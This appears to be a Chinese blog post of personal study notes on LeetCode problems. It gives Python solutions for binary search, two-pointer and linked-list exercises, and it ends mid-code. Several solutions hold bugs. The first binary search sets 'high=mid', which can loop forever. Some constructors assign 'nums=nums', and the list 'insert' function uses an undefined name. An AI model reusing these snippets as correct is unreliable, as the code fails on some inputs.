    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>有链接的都是leetcode题目</p></blockquote><h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704. 二分查找</a></h3><p>​    题目：给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p><p>​    二分查找的前提：</p><ul><li><p>有序数组</p></li><li><p>无重复元素</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python">nums=[-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>]<br>target=<span class="hljs-number">9</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        nums=nums<br>        target=target<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-comment">#classmethod 可以不用实例化类直接调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self,target,nums</span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>        low, high = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(nums) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> low&lt;=high:  <br>            mid=(low+high)//<span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> nums[mid]==target:<br>                <span class="hljs-keyword">return</span> mid<br>            <span class="hljs-keyword">if</span> nums[mid]&lt;target:<br>                low=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> nums[mid]&gt;target:<br>                high=mid<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>           <br>result=Solution.search(target,nums)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="278-第一个错误的版本"><a href="#278-第一个错误的版本" class="headerlink" title="278. 第一个错误的版本"></a><a href="https://leetcode-cn.com/problems/first-bad-version/">278. 第一个错误的版本</a></h3><p>​    题目：你是产品经理，目前正在带领一个团队开发新的产品。不幸的是，你的产品的最新版本没有通过质量检测。由于每个版本都是基于之前的版本开发的，所以错误的版本之后的所有版本都是错的。假设你有 n 个版本 [1, 2, …, n]，你想找出导致之后所有版本出错的第一个错误的版本。你可以通过调用 bool isBadVersion(version) 接口来判断版本号 version 是否在单元测试中出错。实现一个函数来查找第一个错误的版本。你应该尽量减少对调用 API 的次数。</p><div class="code-wrapper"><pre><code class="hljs"> 这个还是可以用二分查找来看，是上一题的简化版算是，我没有在本地跑所以直接提交leetcode答案</code></pre></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">firstBadVersion</span>(<span class="hljs-params">self, n</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        :type n: int</span><br><span class="hljs-string">        :rtype: int</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        left = <span class="hljs-number">1</span><br>        right = n<br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            mid = left + (right-left)//<span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> isBadVersion(mid):<br>                right = mid<br>            <span class="hljs-keyword">else</span>:<br>                left = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> right<br></code></pre></td></tr></table></figure><h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a><a href="https://leetcode-cn.com/problems/search-insert-position/">35. 搜索插入位置</a></h3><p>​    题目：给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 O(log n) 的算法。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">nums=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br>target=<span class="hljs-number">2</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        nums=nums<br>        target=target<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self,target,nums</span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>        low, high = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(nums) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> low&lt;=high:  <br>            mid=(low+high)//<span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> nums[mid]==target:<br>                <span class="hljs-keyword">return</span> mid<br>            <span class="hljs-keyword">if</span> nums[mid]&lt;target:<br>                low=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> nums[mid]&gt;target:<br>                high=mid-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> high+<span class="hljs-number">1</span><br>           <br>result=Solution.search(target,nums)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><p>​    双指针法是指的在遍历对象的过程中，不是使用单个指针进行访问，而是使用两个相同方向或者相反方向的指针进行扫描，从而达到相应的目的。</p><p>一般双指针法有两种表现方式：</p><ol><li>同向移动：在同向移动时，指针互相之间间隔一个距离进行移动</li><li>相向移动：在相向移动中，双指针一个指针在开头，另外一个指针在结尾，根据满足的条件进行移动指针</li></ol><h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title="977. 有序数组的平方"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/">977. 有序数组的平方</a></h3><p>​    题目：给你一个按 <strong>非递减顺序</strong> 排序的整数数组 <code>nums</code>，返回 <strong>每个数字的平方</strong> 组成的新数组，要求也按 <strong>非递减顺序</strong> 排序。</p><p>这题我采用的是相向移动，引用</p><p>这位老哥的GIF进行演示</p><p><img src="https://code-thinking.cdn.bcebos.com/gifs/977.%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9.gif" alt="img"></p><p>从两头开始比较 如果 左边的平方结果&lt; 右边平方结果 那么 结果数组右边为 右数的结果 反之 为左数的结果。</p><p>这样的好处是 处理非递减序列只需要考虑负数的平方是否大于正数的平方，这样两头相比就可以把结果数组的高位一步一步写死。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sortedSquares</span>(<span class="hljs-params">self, nums</span>):</span><br>        n = <span class="hljs-built_in">len</span>(nums)<br>        i,j,k = <span class="hljs-number">0</span>,n - <span class="hljs-number">1</span>,n - <span class="hljs-number">1</span><br>        ans = [-<span class="hljs-number">1</span>] * n<br>        <span class="hljs-keyword">while</span> i &lt;= j:<br>            lm = nums[i] ** <span class="hljs-number">2</span><br>            rm = nums[j] ** <span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> lm &gt; rm:<br>                ans[k] = lm<br>                i += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                ans[k] = rm<br>                j -= <span class="hljs-number">1</span><br>            k -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> ans<br>nums = [-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>]<br>result=Solution.sortedSquares(nums)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="189-轮转数组"><a href="#189-轮转数组" class="headerlink" title="189. 轮转数组"></a><a href="https://leetcode-cn.com/problems/rotate-array/">189. 轮转数组</a></h3><p>轮转数组的思路如下：</p><ol><li>反转整个字符串</li><li>反转区间为前k的子串</li><li>反转区间为k到末尾的子串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><br><br>nums = [-<span class="hljs-number">1</span>,-<span class="hljs-number">100</span>,<span class="hljs-number">3</span>,<span class="hljs-number">99</span>]<br>k = <span class="hljs-number">2</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rotate</span>(<span class="hljs-params">self, A: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>], k: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span>(<span class="hljs-params">i, j</span>):</span><br>            <span class="hljs-keyword">while</span> i &lt; j:<br>                A[i], A[j] = A[j], A[i]  <span class="hljs-comment">#直接交换内容 </span><br>                i += <span class="hljs-number">1</span>   <span class="hljs-comment">#指针相向移动</span><br>                j -= <span class="hljs-number">1</span><br>            <br>        n = <span class="hljs-built_in">len</span>(A)<br>        k %= n<br>        reverse(<span class="hljs-number">0</span>, n - <span class="hljs-number">1</span>)<br>        reverse(<span class="hljs-number">0</span>, k - <span class="hljs-number">1</span>)<br>        reverse(k, n - <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> A<br>result=Solution.rotate(nums,k)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode-cn.com/problems/move-zeroes/">283. 移动零</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imp<br><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> le<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">moveZeroes</span>(<span class="hljs-params">self, nums: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Do not return anything, modify nums in-place instead.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。</span><br><span class="hljs-string">        必须在不复制数组的情况下原地对数组进行操作</span><br><span class="hljs-string">        示例 1:</span><br><span class="hljs-string">        输入: nums = [0,1,0,3,12]</span><br><span class="hljs-string">        输出: [1,3,12,0,0]</span><br><span class="hljs-string">        示例 2:</span><br><span class="hljs-string">        输入: nums = [0]</span><br><span class="hljs-string">        输出: [0]</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        index=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(nums)):  <span class="hljs-comment">#遍历不等0的元素</span><br>            <span class="hljs-keyword">if</span> nums[i] != <span class="hljs-number">0</span>:<br>                nums[index] = nums[i] <span class="hljs-comment">#非零数从第一位开始排</span><br>                index += <span class="hljs-number">1</span><br>        <br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(index,<span class="hljs-built_in">len</span>(nums)):<br>            nums[j] = <span class="hljs-number">0</span>   <span class="hljs-comment">#之后元素全为0</span><br>        <br>        <span class="hljs-keyword">return</span> nums<br>        <br>nums=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>]<br>result=Solution.moveZeroes(nums)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="167-两数之和-II-输入有序数组"><a href="#167-两数之和-II-输入有序数组" class="headerlink" title="167. 两数之和 II - 输入有序数组"></a><a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">twoSum</span>(<span class="hljs-params">self, numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>], target: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:</span><br>        left,right = <span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(numbers)-<span class="hljs-number">1</span>      <br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            <span class="hljs-keyword">if</span> numbers[left] + numbers[right] == target:                <br>                <span class="hljs-keyword">return</span> [left+<span class="hljs-number">1</span>, right+<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">if</span> numbers[left] + numbers[right] &lt; target:<br>                left = left + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> numbers[left] + numbers[right] &gt; target:<br>                right = right - <span class="hljs-number">1</span><br><br>numbers =[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>target =<span class="hljs-number">6</span><br>result=Solution.twoSum(numbers=numbers,target=target)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode-cn.com/problems/reverse-string/">344. 反转字符串</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><span class="hljs-keyword">from</span> unittest <span class="hljs-keyword">import</span> result<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverseString</span>(<span class="hljs-params">self, s: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-literal">None</span>:</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Do not return anything, modify s in-place instead.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        i,j=<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)-<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> i&lt;j:<br>            s[i],s[j]=s[j],s[i]<br>            i+=<span class="hljs-number">1</span><br>            j-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> s<br><br>s = [<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>]<br>result=Solution.reverseString(s)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>然后就是紫砂题解 <code>return s.reverse()</code> <code>return s[::-1]</code></p><h3 id="557-反转字符串中的单词-III"><a href="#557-反转字符串中的单词-III" class="headerlink" title="557. 反转字符串中的单词 III"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">557. 反转字符串中的单词 III</a></h3><p>思路：先用split进行切片 然后翻转单个单词 再补上空格比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#coding:utf-8</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverseWords</span>(<span class="hljs-params">self, s: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27; &#x27;</span>.join(word[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> s.split(<span class="hljs-string">&quot; &quot;</span>)))<br>        <br>        <br>        <br>s=<span class="hljs-string">&quot;Let&#x27;s take LeetCode contest&quot;</span><br>result=Solution.reverseWords(s)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876. 链表的中间结点"></a><a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/">876. 链表的中间结点</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># Definition for singly-linked list.</span><br><span class="hljs-comment"># class ListNode:</span><br><span class="hljs-comment">#     def __init__(self, val=0, next=None):</span><br><span class="hljs-comment">#         self.val = val</span><br><span class="hljs-comment">#         self.next = next</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">middleNode</span>(<span class="hljs-params">self, head: ListNode</span>) -&gt; ListNode:</span><br>        slow = fast = head<br>        <span class="hljs-keyword">while</span> fast <span class="hljs-keyword">and</span> fast.<span class="hljs-built_in">next</span>:<br>            slow = slow.<span class="hljs-built_in">next</span><br>            fast = fast.<span class="hljs-built_in">next</span>.<span class="hljs-built_in">next</span><br>        <span class="hljs-keyword">return</span> slow<br></code></pre></td></tr></table></figure><p>这里可以采用快慢指针法 这样 fast永远比slow快一步，当fast到达结尾是 slow一定处于中间位置。</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203. 移除链表元素"></a><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">203. 移除链表元素</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Definition for singly-linked list.</span><br><span class="hljs-comment"># class ListNode:</span><br><span class="hljs-comment">#     def __init__(self, val=0, next=None):</span><br><span class="hljs-comment">#         self.val = val</span><br><span class="hljs-comment">#         self.next = next</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">removeElements</span>(<span class="hljs-params">self, head: ListNode, val: <span class="hljs-built_in">int</span></span>) -&gt; ListNode:</span><br>        dummy_head = ListNode(<span class="hljs-built_in">next</span>=head) <span class="hljs-comment">#添加一个节点</span><br>        cur = dummy_head<br>        <span class="hljs-keyword">while</span>(cur.<span class="hljs-built_in">next</span>!=<span class="hljs-literal">None</span>):<br>            <span class="hljs-keyword">if</span>(cur.<span class="hljs-built_in">next</span>.val == val):<br>                cur.<span class="hljs-built_in">next</span> = cur.<span class="hljs-built_in">next</span>.<span class="hljs-built_in">next</span> <span class="hljs-comment">#删除节点</span><br>            <span class="hljs-keyword">else</span>:<br>                cur = cur.<span class="hljs-built_in">next</span><br>        <span class="hljs-keyword">return</span> dummy_head.<span class="hljs-built_in">next</span><br></code></pre></td></tr></table></figure><h3 id="小王子的单链表"><a href="#小王子的单链表" class="headerlink" title="小王子的单链表"></a>小王子的单链表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, value, <span class="hljs-built_in">next</span>=<span class="hljs-literal">None</span></span>):</span><br>        self.value = value<br>        self.<span class="hljs-built_in">next</span> = <span class="hljs-built_in">next</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createLink</span>():</span><br>    root = Node(<span class="hljs-number">0</span>)<br>    tmp = root<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        tmp.<span class="hljs-built_in">next</span> = Node(i+<span class="hljs-number">1</span>)<br>        tmp = tmp.<span class="hljs-built_in">next</span><br><br>    tmp.<span class="hljs-built_in">next</span> = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> root<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">insert</span>(<span class="hljs-params">x, linkedroot</span>):</span><br>    tmp = Node(x)<br>    tmp.<span class="hljs-built_in">next</span> = root.<span class="hljs-built_in">next</span><br>    root.<span class="hljs-built_in">next</span> = tmp<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">x, root</span>):</span><br>    tmp = tmp1 = root<br><br>    <span class="hljs-keyword">while</span> tmp != <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> tmp.value == x:<br>            tmp1.<span class="hljs-built_in">next</span> = tmp.<span class="hljs-built_in">next</span><br><br>        tmp1 = tmp<br>        tmp = tmp.<span class="hljs-built_in">next</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">root</span>):</span><br>    tmp = root.<span class="hljs-built_in">next</span><br>    <span class="hljs-keyword">while</span> tmp != <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(tmp.value, end=<span class="hljs-string">&quot; &quot;</span>)<br>        tmp = tmp.<span class="hljs-built_in">next</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span 